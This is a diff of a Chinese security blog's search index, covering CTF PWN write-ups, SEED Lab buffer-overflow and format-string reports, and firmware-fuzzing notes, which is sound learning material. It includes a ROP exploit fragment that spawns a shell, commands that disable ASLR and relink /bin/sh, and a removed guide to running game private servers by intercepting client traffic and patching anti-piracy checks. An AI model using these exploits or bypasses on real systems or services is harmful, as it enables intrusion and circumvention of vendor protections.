flat(<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>), ret, pop_rdi, bin_sh, system)</span><br><span class="line">gdb.attach(p, <span class="string">f&#x27;b *0x<span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>注：如果不加<code>ret</code>，<code>pop rdi</code>栈地址为<code>0x47e4b8</code>末尾不为0，因此无法正确执行，所以需要加入ret，使后面命令对齐。</p>
-</li>
-</ul>
-<p><img src="/images/2023-10-23-pwn4/images/stack-1.png" alt="stack-1"></p>
-<p>​		加入<code>ret</code>后栈的情况。</p>
-<p><img src="/images/2023-10-23-pwn4/images/stack.png" alt="stack"></p>
-<ul>
-<li>结果成功利用栈溢出获取到shell：</li>
-</ul>
-<p><img src="/images/2023-10-23-pwn4/images/result.png" alt="result"></p>
-]]></content>
-      <tags>
-        <tag>教程</tag>
-        <tag>CTF</tag>
-        <tag>PWN</tag>
-        <tag>格式化字符串漏洞</tag>
       </tags>
   </entry>
   <entry>
     <title>PWN5 WriteUp</title>
     <url>/posts/2ba0cfe.html</url>
-    <content><![CDATA[<h3 id="PWN5"><a href="#PWN5" class="headerlink" title="PWN5"></a>PWN5</h3><h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><ul>
+    <content><![CDATA[<h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><ul>
 <li>对<code>ldd, patchelf</code>命令以及依赖库版本的了解</li>
 <li>对ASLR机制的理解</li>
 <li><code>one_gadget</code>工具使用</li>
@@ -766,28 +785,9 @@
       </tags>
   </entry>
   <entry>
-    <title>某二次元游戏私服搭建总结</title>
-    <url>/posts/af718253.html</url>
-    <content><![CDATA[<h1 id="某二次元游戏私服搭建总结"><a href="#某二次元游戏私服搭建总结" class="headerlink" title="某二次元游戏私服搭建总结"></a>某二次元游戏私服搭建总结</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>经过大概几个小时的配置环境并debug，终于把Genshin Impact和星穹铁道的私服配置好了。中间也学到了很多东西，以下对整个过程做一个总结。</p>
-<h2 id="需要的环境"><a href="#需要的环境" class="headerlink" title="需要的环境"></a><strong>需要的环境</strong></h2><p>Genshin Impact3.4客户端（光是这个就很难找，最后在迅雷上找到了种子），Grasscutter1.4.6最新版，Fiddler最新版，Grasscutter-resources3.4版本，mongod数据库最新版</p>
-<h2 id="需要用到的知识"><a href="#需要用到的知识" class="headerlink" title="需要用到的知识"></a><strong>需要用到的知识</strong></h2><p>（非必要，但懂的话做起来更顺利，懂的话就能够进行简单的debug）：<br>1.了解网络代理，证书的相关知识与原理；<br>2.C，JavaScript，shell语言；（能看懂即可）<br>3.了解数据库的运行机制和内部构造；<br>4.了解服务器与客户端与数据库的数据交互过程与方法，网络端口通信；<br>5.会使用命令行，会配置环境变量；<br>6.能科学上网（主要用来上github，不过有时github不用魔法也能打开~）<br>上面所提到的知识主要用于在搭建过程中出现了问题时debug，当然网上也有各种教程，不过网上教程不一定就可以解决你搭建过程出现的问题。所以up强烈建议有上面的知识基础的可以去搞，没有的话搭建起来会很痛苦（来自up本人一年前和一年后的学完上面知识后的亲身体验）。</p>
-<h2 id="私服运行主要原理"><a href="#私服运行主要原理" class="headerlink" title="私服运行主要原理"></a><strong>私服运行主要原理</strong></h2><p>原神由于之前工作人员失误导致了私服的产生，目前私服的运行主要由三部分组成，分别是服务器端，客户端和网络代理端，服务器端是Grasscutter大佬自己手搓出来的，客户端是官方的版本包，网络代理用于阻断客户端与官方服务器的连接，并将连接重定向到本地搭建的Grasscutter，也就是私服。</p>
-<h2 id="配置环境主要步骤"><a href="#配置环境主要步骤" class="headerlink" title="配置环境主要步骤"></a><strong>配置环境主要步骤</strong></h2><p>1.从github上下载Grasscutter最新版1.4.6版本，还需要gitlab上与之配套的resources和proto，注意版本对应（不对应会导致编译出错等问题，即使成功可能在后面也会有一些问题），resources指Grasscutter搭建所需的资源，proto主要可以修复进入游戏后角色技能不能治疗的bug。<br>2.根据github内Grasscutter的ReadMe文档将服务器搭建好。并且根据其WiKi搭好Fiddler（用于实现网络代理功能）和mongod数据库。<br>3.从网上下载Genshin Impact3.4包，注意版本对应，Grasscutter1.4.6对应原神3.4版本。版本不对应可能会导致创建账号后卡在进入界面，一直白屏。</p>
-<h2 id="运行主要步骤"><a href="#运行主要步骤" class="headerlink" title="运行主要步骤"></a><strong>运行主要步骤</strong></h2><p>1.在github上Grasscutter有教程，不仔细展开，在mongod.exe所在目录terminal，运行命令打开数据库，只要terminal界面运行不中断就表明数据库配置成功。<br>2.在Grasscutter文件夹打开命令行，输入命令启动服务器。显示服务器以成功运行，没有报错即表示服务器启动成功，注意要先开数据库，再开服务器，否则服务器端会报错。服务器端开启后在命令行输入命令创建账户，命令在github上都有，不再列出。<br>3.打开Fiddler，添加Grasscutter提供的配置规则，并且修改设置允许https解密，修改默认端口为任意值（只要不是默认8888就可，up也不知道为什么~）。<br>4.打开原神3.4客户端，注意此处为自己下载的客户端内部的yuanshen.exe。进入登录页面Fiddler会有弹窗点击确认即可，这里是指是否信任对方证书，而此时对方是我们自己搭建的服务器，所以直接信任就可。点击确认后，就可以正常登陆自己在服务器创建的用户了。</p>
-<h2 id="崩坏：星穹铁道私服"><a href="#崩坏：星穹铁道私服" class="headerlink" title="崩坏：星穹铁道私服"></a><strong>崩坏：星穹铁道私服</strong></h2><p>总体思路与原神差不多，并且要比原神简单很多（因为客户端是测试服的包，所以加密防护做的并没有原神好，不需要打补丁），具体过程只需把客户端改为星穹铁道测试服版本，然后运行数据库，运行服务器（这里你需要去网上找资源，Grasscutter服务器是java搭建的，而星穹铁道是用node搭建的，up因为用过node，所以很快就配置完成了），但由于网上基本没有资源，并且教程也极少，而且其也即将开服等等原因，就不再赘述了。</p>
-<h2 id="搭建过程中遇到的问题"><a href="#搭建过程中遇到的问题" class="headerlink" title="搭建过程中遇到的问题"></a><strong>搭建过程中遇到的问题</strong></h2><p><strong>星穹铁道：</strong><br>  1.运行服务器端报错显示版本不对；<br>  解决办法：将显示版本不对的包更新。<br>  2.打开客户端后显示全局分发错误。<br>  解决办法：是代理出现问题，更改其规则并且修改设置中开放端口。<br>  3.同2的另一种原因。似乎是使用了校园网，更改后问题解决。</p>
-<p><strong>原神：</strong><br>  1.进入后显示4214报错；<br>  原因：原神在2.8版本后就开始增加了客户端对服务器的检测，目的就是打击私服<br>  解决办法：Grasscutter大佬已经打了补丁，不过不同版本补丁也不尽相同，并且目前最新版本3.5版本也暂时没有，3.4版本似乎是使用了公私钥加密来做了密钥协商，不过Grasscutter大佬还是把补丁搓出来了（膜~~~）根据github上教程安装补丁即可<br>  2.打补丁后发现可以登录但进不去，卡在进入界面，一直白屏；<br>  原因：大概率是因为版本不对应，网上有说是因为udp连接端口没打开，代理有问题的基本全是错的（如果你是服务器在自己本地的话）。<br>  解决方法：检查一遍各个资源版本是否对应。<br>  3.更换资源后编译服务器报错；<br>  原因：之前已经编译过的话，服务器内部就已经存储了数据和配置，需要把这些都删掉再编译；<br>  解决办法：删去data，cache文件夹，还是不行就重新下载Grasscutter，重新编译。</p>
-<p>另外还需要检查是否关闭了vpn，debug时建议查看数据库，服务器端和fiddler的输出信息来判断。</p>
-<h2 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a><strong>总结感想</strong></h2><p>整个私服配置下来还是很繁琐的，并且搭建过程中需要大量的时间debug，up在搭建过程中就遇到了各种各样的问题，并且网上教程解决方案较少，并且大多数都是不对的，如果了解上面所提到的那些知识的话，debug的时间就会大幅缩小，并且你也会在搭建过程中作很好的实践，并学到很多新东西。up也是在多次查询博客教程无果后选择自己去解决，然后发现大学学的课程还真有用~~~。<br>本篇文章主要用作up本人学习总结用，也希望能给正在搭建私服的人思路，并且up在此也建议没有计算机基础的同学尽量不要碰，否则会变得不幸。</p>
-]]></content>
-      <tags>
-        <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【SEED Lab2.0】缓冲区溢出实验报告</title>
     <url>/posts/637eab0b.html</url>
-    <content><![CDATA[<h1 id="缓冲区溢出实验报告"><a href="#缓冲区溢出实验报告" class="headerlink" title="缓冲区溢出实验报告"></a>缓冲区溢出实验报告</h1><h2 id="stack-overflow-setuid"><a href="#stack-overflow-setuid" class="headerlink" title="stack_overflow(setuid)"></a>stack_overflow(setuid)</h2><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>配置环境，关闭ASLR地址随机化，将&#x2F;bin&#x2F;sh链接到&#x2F;bin&#x2F;zsh（&#x2F;bin&#x2F;dash以及&#x2F;bin&#x2F;bash都实现了一种安全对策， 防止自己在Set-UID进程中执行。 基本上，如果它们检测到它们是在一个Set-UID进程中执行的， 它们会立即将有效的用户ID更改为该进程的真实用户ID， 基本上会放弃特权  ）</p>
+    <content><![CDATA[<h2 id="stack-overflow-setuid"><a href="#stack-overflow-setuid" class="headerlink" title="stack_overflow(setuid)"></a>stack_overflow(setuid)</h2><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>配置环境，关闭ASLR地址随机化，将&#x2F;bin&#x2F;sh链接到&#x2F;bin&#x2F;zsh（&#x2F;bin&#x2F;dash以及&#x2F;bin&#x2F;bash都实现了一种安全对策， 防止自己在Set-UID进程中执行。 基本上，如果它们检测到它们是在一个Set-UID进程中执行的， 它们会立即将有效的用户ID更改为该进程的真实用户ID， 基本上会放弃特权  ）</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0 </span><br><span class="line">kernel.randomize_va_space = 0</span><br><span class="line">❯ sudo ln -sf /bin/zsh /bin/sh</span><br></pre></td></tr></table></figure>
 
 <h3 id="Task1：-熟悉shellcode"><a href="#Task1：-熟悉shellcode" class="headerlink" title="Task1： 熟悉shellcode"></a>Task1： 熟悉shellcode</h3><p><code>shellcode C代码实现</code>：</p>
@@ -951,7 +951,7 @@
   <entry>
     <title>get_started_3dsctf_2016 WriteUp</title>
     <url>/posts/3d8ffbc0.html</url>
-    <content><![CDATA[<h1 id="get-started-3dsctf-2016-WriteUp"><a href="#get-started-3dsctf-2016-WriteUp" class="headerlink" title="get_started_3dsctf_2016 WriteUp"></a>get_started_3dsctf_2016 WriteUp</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
+    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
 <li>对栈溢出函数带参数的溢出理解</li>
 </ul>
 <h2 id="解题内容"><a href="#解题内容" class="headerlink" title="解题内容"></a>解题内容</h2><ol>
@@ -989,7 +989,7 @@
   <entry>
     <title>【SEED Lab2.0】Return_to_Libc实验报告</title>
     <url>/posts/53f1e8f.html</url>
-    <content><![CDATA[<h1 id="Return-to-Libc实验报告"><a href="#Return-to-Libc实验报告" class="headerlink" title="Return_to_Libc实验报告"></a>Return_to_Libc实验报告</h1><h3 id="Task1：Finding-out-the-Addresses-of-libc-Functions"><a href="#Task1：Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task1：Finding out the Addresses of libc Functions"></a>Task1：Finding out the Addresses of libc Functions</h3><ol>
+    <content><![CDATA[<h3 id="Task1：Finding-out-the-Addresses-of-libc-Functions"><a href="#Task1：Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task1：Finding out the Addresses of libc Functions"></a>Task1：Finding out the Addresses of libc Functions</h3><ol>
 <li><p>获取system函数和exit函数地址</p>
 <p><img src="/images/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/%E8%8E%B7%E5%8F%96system%E5%92%8Cexit%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80.png" alt="获取system和exit函数地址"></p>
 </li>
@@ -1082,7 +1082,7 @@
   <entry>
     <title>格式化字符串实验报告</title>
     <url>/posts/5a0832a9.html</url>
-    <content><![CDATA[<h1 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h1><h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1 Overview"></a>1 Overview</h2><p><code>printf</code>函数用于根据指定格式打印出字符串，第一个参数诶格式化字符串<code>format string</code>，格式化字符串中使用了<code>%</code>来作为占位符。如果不使用<code>%</code>占位符而是直接将变量放入格式化字符串，则存在格式化字符串漏洞，可能被恶意利用。</p>
+    <content><![CDATA[<h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1 Overview"></a>1 Overview</h2><p><code>printf</code>函数用于根据指定格式打印出字符串，第一个参数诶格式化字符串<code>format string</code>，格式化字符串中使用了<code>%</code>来作为占位符。如果不使用<code>%</code>占位符而是直接将变量放入格式化字符串，则存在格式化字符串漏洞，可能被恶意利用。</p>
 <h2 id="2-Environment-Setup"><a href="#2-Environment-Setup" class="headerlink" title="2 Environment Setup"></a>2 Environment Setup</h2><h3 id="2-1-Turning-of-Countermeasure"><a href="#2-1-Turning-of-Countermeasure" class="headerlink" title="2.1 Turning of Countermeasure"></a>2.1 Turning of Countermeasure</h3><p>关闭ASLR</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">kernel.randomize_va_space = 0</span><br></pre></td></tr></table></figure>
 
@@ -1175,9 +1175,62 @@
       </tags>
   </entry>
   <entry>
+    <title>P2IM复现</title>
+    <url>/posts/5786d6f8.html</url>
+    <content><![CDATA[<p>导师说要多实践，因此将看过的P2IM论文进行复现，同时对源码进行简单查看。</p>
+<p>看网上并没有相关的复现教程，因此写下该博客</p>
+<p>链接: <a href="https://github.com/RiS3-Lab/p2im">https://github.com/RiS3-Lab/p2im</a></p>
+<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu 16.04 !!!（重中之重！其他版本可能不成功）</p>
+<p>GNU Arm Embedded Toolchain：<a href="https://developer.arm.com/downloads/-/gnu-rm">https://developer.arm.com/downloads/-/gnu-rm</a></p>
+<p>fuzz target: <a href="https://github.com/RiS3-Lab/p2im-real_firmware/tree/d4c7456574ce2c2ed038e6f14fea8e3142b3c1f7/binary">https://github.com/RiS3-Lab/p2im-real_firmware/tree/d4c7456574ce2c2ed038e6f14fea8e3142b3c1f7/binary</a></p>
+<h2 id="2-过程"><a href="#2-过程" class="headerlink" title="2. 过程"></a>2. 过程</h2><ol>
+<li><p>首先下载p2im源码</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/RiS3-Lab/p2im.git</span><br><span class="line"><span class="built_in">cd</span> p2im</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下载子项目</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># submodules are cloned into externals/</span></span><br><span class="line">git submodule update --init</span><br><span class="line">git submodule update --remote</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下载并解压GNU Arm Embedded Toolchain，并且将其内&#x2F;bin目录添加到环境变量</p>
+</li>
+<li><p>编译AFL，ubuntu16.04测试没有问题，ubuntu22.04不行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Compile AFL</span></span><br><span class="line">make -C afl/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Qemu已经在项目里预编译好了，不需要额外配置</p>
+</li>
+</ol>
+<h2 id="3-Fuzzing"><a href="#3-Fuzzing" class="headerlink" title="3. Fuzzing"></a>3. Fuzzing</h2><ol>
+<li><p>确定工作区</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WORKING_DIR=&lt;repo_path&gt;/fuzzing/&lt;firmware_name&gt;/&lt;fuzzing_run_num&gt;/</span><br><span class="line">mkdir -p $&#123;WORKING_DIR&#125;</span><br><span class="line">cd $&#123;WORKING_DIR&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将输入seed文件复制到工作区&#x2F;inputs文件夹下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copy the <span class="string">&quot;random&quot;</span> seed to the working directory</span></span><br><span class="line">cp -r &lt;repo_path&gt;/fuzzing/templates/seeds/ $&#123;WORKING_DIR&#125;/inputs</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将配置文件fuzz.cfg.template文件复制到工作区下，注意：文件名和内容需要根据修改！要把文件内&lt;&gt;的内容改为实际绝对地址</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copy the template to the working directory</span></span><br><span class="line">cp &lt;repo_path&gt;/fuzzing/templates/fuzz.cfg.template fuzz.cfg</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>开始fuzz</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;repo_path&gt;/model_instantiation/fuzz.py -c fuzz.cfg</span><br></pre></td></tr></table></figure>
+
+<p>难绷，还是报错。。。不知道是哪儿的问题。。。</p>
+<p><img src="/images/2023-12-18-P2IM%E5%A4%8D%E7%8E%B0.assets/image-20231218185021864.png" alt="image-20231218185021864"></p>
+</li>
+</ol>
+<p>又试了几次，其中把报错上面的命令又跑了跑，再运行发现就可以了。。。</p>
+<p><img src="/images/2023-12-18-P2IM%E5%A4%8D%E7%8E%B0.assets/image-20231218190107050.png" alt="image-20231218190107050"></p>
+<p><img src="/images/2023-12-18-P2IM%E5%A4%8D%E7%8E%B0.assets/image-20231218190125898.png" alt="image-20231218190125898"></p>
+]]></content>
+      <tags>
+        <tag>IS</tag>
+        <tag>IoT</tag>
+        <tag>Fuzz</tag>
+        <tag>固件模拟</tag>
+        <tag>论文复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>uEmu复现</title>
     <url>/posts/8c8037e9.html</url>
-    <content><![CDATA[<h1 id="uEmu复现"><a href="#uEmu复现" class="headerlink" title="uEmu复现"></a>uEmu复现</h1><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu 20.04（最好分配大于20G存储空间，否则可能不够用）</p>
+    <content><![CDATA[<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu 20.04（最好分配大于20G存储空间，否则可能不够用）</p>
 <p>gitee链接：<a href="https://gitee.com/cpdt/uEmu.git">https://gitee.com/cpdt/uEmu.git</a></p>
 <p>virtualbox</p>
 <h2 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2. 步骤"></a>2. 步骤</h2><ol>
@@ -1250,7 +1303,7 @@
   <entry>
     <title>Fuzzware论文笔记</title>
     <url>/posts/fd2ce383.html</url>
-    <content><![CDATA[<h1 id="Fuzzware-Using-Precise-MMIO-Modeling-for-Effective-Firmware-Fuzzing"><a href="#Fuzzware-Using-Precise-MMIO-Modeling-for-Effective-Firmware-Fuzzing" class="headerlink" title="Fuzzware: Using Precise MMIO Modeling for Effective Firmware Fuzzing"></a>Fuzzware: Using Precise MMIO Modeling for Effective Firmware Fuzzing</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>实现了模拟器Fuzzware，特点：减少了fuzz的input开销，节省了时间。</p>
+    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>实现了模拟器Fuzzware，特点：减少了fuzz的input开销，节省了时间。</p>
 <h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>针对当前几种对固件模拟fuzz的方法的局限性进行了分析</p>
 <ul>
 <li>high-level模拟：通过挂钩完全绕过MMIO的模拟。<strong>局限：过于high-level，无法发现外设驱动代码的漏洞。</strong></li>
@@ -1314,62 +1367,9 @@
       </tags>
   </entry>
   <entry>
-    <title>P2IM复现</title>
-    <url>/posts/5786d6f8.html</url>
-    <content><![CDATA[<h1 id="P2IM论文复现"><a href="#P2IM论文复现" class="headerlink" title="P2IM论文复现"></a>P2IM论文复现</h1><p>导师说要多实践，因此将看过的P2IM论文进行复现，同时对源码进行简单查看。</p>
-<p>看网上并没有相关的复现教程，因此写下该博客</p>
-<p>链接: <a href="https://github.com/RiS3-Lab/p2im">https://github.com/RiS3-Lab/p2im</a></p>
-<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu 16.04 !!!（重中之重！其他版本可能不成功）</p>
-<p>GNU Arm Embedded Toolchain：<a href="https://developer.arm.com/downloads/-/gnu-rm">https://developer.arm.com/downloads/-/gnu-rm</a></p>
-<p>fuzz target: <a href="https://github.com/RiS3-Lab/p2im-real_firmware/tree/d4c7456574ce2c2ed038e6f14fea8e3142b3c1f7/binary">https://github.com/RiS3-Lab/p2im-real_firmware/tree/d4c7456574ce2c2ed038e6f14fea8e3142b3c1f7/binary</a></p>
-<h2 id="2-过程"><a href="#2-过程" class="headerlink" title="2. 过程"></a>2. 过程</h2><ol>
-<li><p>首先下载p2im源码</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/RiS3-Lab/p2im.git</span><br><span class="line"><span class="built_in">cd</span> p2im</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>下载子项目</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># submodules are cloned into externals/</span></span><br><span class="line">git submodule update --init</span><br><span class="line">git submodule update --remote</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>下载并解压GNU Arm Embedded Toolchain，并且将其内&#x2F;bin目录添加到环境变量</p>
-</li>
-<li><p>编译AFL，ubuntu16.04测试没有问题，ubuntu22.04不行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Compile AFL</span></span><br><span class="line">make -C afl/</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Qemu已经在项目里预编译好了，不需要额外配置</p>
-</li>
-</ol>
-<h2 id="3-Fuzzing"><a href="#3-Fuzzing" class="headerlink" title="3. Fuzzing"></a>3. Fuzzing</h2><ol>
-<li><p>确定工作区</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WORKING_DIR=&lt;repo_path&gt;/fuzzing/&lt;firmware_name&gt;/&lt;fuzzing_run_num&gt;/</span><br><span class="line">mkdir -p $&#123;WORKING_DIR&#125;</span><br><span class="line">cd $&#123;WORKING_DIR&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>将输入seed文件复制到工作区&#x2F;inputs文件夹下</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copy the <span class="string">&quot;random&quot;</span> seed to the working directory</span></span><br><span class="line">cp -r &lt;repo_path&gt;/fuzzing/templates/seeds/ $&#123;WORKING_DIR&#125;/inputs</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>将配置文件fuzz.cfg.template文件复制到工作区下，注意：文件名和内容需要根据修改！要把文件内&lt;&gt;的内容改为实际绝对地址</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copy the template to the working directory</span></span><br><span class="line">cp &lt;repo_path&gt;/fuzzing/templates/fuzz.cfg.template fuzz.cfg</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>开始fuzz</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;repo_path&gt;/model_instantiation/fuzz.py -c fuzz.cfg</span><br></pre></td></tr></table></figure>
-
-<p>难绷，还是报错。。。不知道是哪儿的问题。。。</p>
-<p><img src="/images/2023-12-18-P2IM%E5%A4%8D%E7%8E%B0.assets/image-20231218185021864.png" alt="image-20231218185021864"></p>
-</li>
-</ol>
-<p>又试了几次，其中把报错上面的命令又跑了跑，再运行发现就可以了。。。</p>
-<p><img src="/images/2023-12-18-P2IM%E5%A4%8D%E7%8E%B0.assets/image-20231218190107050.png" alt="image-20231218190107050"></p>
-<p><img src="/images/2023-12-18-P2IM%E5%A4%8D%E7%8E%B0.assets/image-20231218190125898.png" alt="image-20231218190125898"></p>
-]]></content>
-      <tags>
-        <tag>IS</tag>
-        <tag>IoT</tag>
-        <tag>Fuzz</tag>
-        <tag>固件模拟</tag>
-        <tag>论文复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>P2IM论文笔记</title>
     <url>/posts/1c19887b.html</url>
-    <content><![CDATA[<h1 id="P2IM-Scalable-and-Hardware-independent-Firmware-Testing-via-Automatic-Peripheral-Interface-Modeling"><a href="#P2IM-Scalable-and-Hardware-independent-Firmware-Testing-via-Automatic-Peripheral-Interface-Modeling" class="headerlink" title="P2IM: Scalable and Hardware-independent Firmware Testing via Automatic Peripheral Interface Modeling"></a>P2IM: Scalable and Hardware-independent Firmware Testing via Automatic Peripheral Interface Modeling</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>背景：</strong>模拟以MCU为处理器的固件设备并没有完全的模拟外设，导致fuzzing时外设需要实际物理设备，速度偏慢，且没有达到完全模拟。</p>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>背景：</strong>模拟以MCU为处理器的固件设备并没有完全的模拟外设，导致fuzzing时外设需要实际物理设备，速度偏慢，且没有达到完全模拟。</p>
 <p>主要实现了一个可以模拟在MCU下运行的固件的模拟器P2IM。通过自动化外设接口的建模来进行自动化，可扩展的模拟。</p>
 <p>特点：对mcu架构下的寄存器进行分类识别，在qemu模拟时同时模拟这些寄存器值的操作，从而模拟出了firmware外设的一系列操作。保证了firmware在qemu上的稳定运行的同时加入了外设的模拟。</p>
 <h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>当时对固件的模拟需要软硬件结合，导致fuzz的效率很慢，因此提出了一种模拟器对固件完全模拟的思路，通过实现对固件外设寄存器的分类并模拟以达到完全模拟的目的。</p>
@@ -1438,7 +1438,7 @@
   <entry>
     <title>SFuzz论文笔记</title>
     <url>/posts/69313c9b.html</url>
-    <content><![CDATA[<h1 id="SFuzz-Slice-based-Fuzzing-for-Real-Time-Operating-Systems"><a href="#SFuzz-Slice-based-Fuzzing-for-Real-Time-Operating-Systems" class="headerlink" title="SFuzz: Slice-based Fuzzing for Real-Time Operating Systems"></a>SFuzz: Slice-based Fuzzing for Real-Time Operating Systems</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RTOS系统当下并没有很好的分析方式，因此作者提出了sfuzz工具，利用RTOS每一项任务的控制流都是独立的特点，从RTOS系统中切出独立的代码块进行fuzzing。</p>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RTOS系统当下并没有很好的分析方式，因此作者提出了sfuzz工具，利用RTOS每一项任务的控制流都是独立的特点，从RTOS系统中切出独立的代码块进行fuzzing。</p>
 <p>项目地址：<a href="https://github.com/NSSL-SJTU/SFuzz">https://github.com/NSSL-SJTU/SFuzz</a></p>
 <h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>解决了在当时RTOS领域模糊测试没有很好的分析方式的问题。</p>
 <h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
@@ -1505,7 +1505,7 @@
   <entry>
     <title>linux虚拟机设置github加速</title>
     <url>/posts/d1a2e76c.html</url>
-    <content><![CDATA[<h1 id="Linux虚拟机设置github加速"><a href="#Linux虚拟机设置github加速" class="headerlink" title="Linux虚拟机设置github加速"></a>Linux虚拟机设置github加速</h1><p>最近在使用vmware虚拟机跑项目复现，需要频繁使用github，因此在此记录下github加速的简单方法</p>
+    <content><![CDATA[<p>最近在使用vmware虚拟机跑项目复现，需要频繁使用github，因此在此记录下github加速的简单方法</p>
 <p><a href="https://zhuanlan.zhihu.com/p/432414619">https://zhuanlan.zhihu.com/p/432414619</a></p>
 ]]></content>
       <tags>
@@ -1517,7 +1517,7 @@
   <entry>
     <title>uEmu论文笔记</title>
     <url>/posts/65903227.html</url>
-    <content><![CDATA[<h1 id="Automatic-Firmware-Emulation-through-Invalidity-guided-Knowledge-Inference"><a href="#Automatic-Firmware-Emulation-through-Invalidity-guided-Knowledge-Inference" class="headerlink" title="Automatic Firmware Emulation through Invalidity-guided Knowledge Inference"></a>Automatic Firmware Emulation through Invalidity-guided Knowledge Inference</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>设计了μEmu，使用动态符号执行的方式规避了P2IM需要人工参与基于Access-Pattern对MMIO进行分类的问题，但是存在了路径消失的问题。</p>
+    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>设计了μEmu，使用动态符号执行的方式规避了P2IM需要人工参与基于Access-Pattern对MMIO进行分类的问题，但是存在了路径消失的问题。</p>
 <h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>当前已有的对固件模拟方法有在硬件上进行模拟，完全脱离硬件模拟等方式，但都有其缺点。例如结合硬件会使fuzzing效率降低，模拟外设P2IM存在寄存器错分类。</p>
 <p>uEmu采用动态符号执行技术对固件进行fuzz。</p>
 <h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
@@ -1560,7 +1560,7 @@
   <entry>
     <title>Fudge论文笔记</title>
     <url>/posts/edb8c304.html</url>
